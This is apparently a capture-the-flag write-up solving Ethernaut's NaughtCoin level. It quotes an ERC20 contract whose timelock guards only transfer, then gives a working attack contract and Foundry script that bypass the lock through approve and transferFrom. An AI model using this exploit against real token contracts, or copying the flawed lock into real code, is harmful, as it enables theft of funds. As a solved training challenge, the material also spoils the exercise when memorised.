# Ethernaut Level 15 NaughtCoin

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

We have to figure out a way to transfer out all our tokens to some other address. Function `transfer` has been locked by the modifier `lockTokens()` so we can't directly call `transfer` to other address. If we go back and see the father contract `ERC20.sol`, we can find out that there are actually two methods that can enable us transfer tokens: `transfer` and `transferFrom`. Maybe we can use `transferFrom` to avoid directly calling `transfer`. In function `transferFrom`:

```solidity
function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }
```

We have to first call `_spendAllowance` to spend some allowance of the spender (`msg.sender`), and then call `_transfer`.

```solidity
function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
```

In function `_spendAllowance`, we basically reapprove the spender with the amount of `currentAllowance - value`. We can go to function `_approve` for more information:

```solidity
function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }
```

In this internal function `_approve`, we let the owner to approve spender a certain amount of tokens. And the public version of it is just setting the owner to be the `msg.sender`:

```solidity
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }
```

So that is all for the logic part. We can first approve an attack contract some tokens from our EOA (owner), and then call `transferFrom` from the attack contract.

`NaughtCoinAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {console} from "forge-std/console.sol";

contract NaughtCoinAttack {

    function attack(address naughtCoinAddress, uint256 amount) public {
        ERC20 naughtCoin = ERC20(naughtCoinAddress);
        console.log("Allowance set to:", naughtCoin.allowance(msg.sender, address(this)));
        naughtCoin.transferFrom(msg.sender, address(this), amount);
    }

}
```

`NaughtCoin.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";
import {NaughtCoinAttack} from "../src/NaughtCoinAttack.sol";

contract NaughtCoinScript is Script {
    NaughtCoin naughtCoin = NaughtCoin(0xXXXXXXXXXXXXXXX);
    NaughtCoinAttack naughtCoinAttack;
    uint256 amount = 1000000 * (10 ** uint256(naughtCoin.decimals()));

    function run() external {
        vm.startBroadcast();
        naughtCoinAttack = new NaughtCoinAttack();
        naughtCoin.approve(address(naughtCoinAttack), amount);
        naughtCoinAttack.attack(address(naughtCoin), amount);
        vm.stopBroadcast();
        console.log("NaughtCoin balance of attacker:", naughtCoin.balanceOf(address(naughtCoinAttack)));
    }
}
```

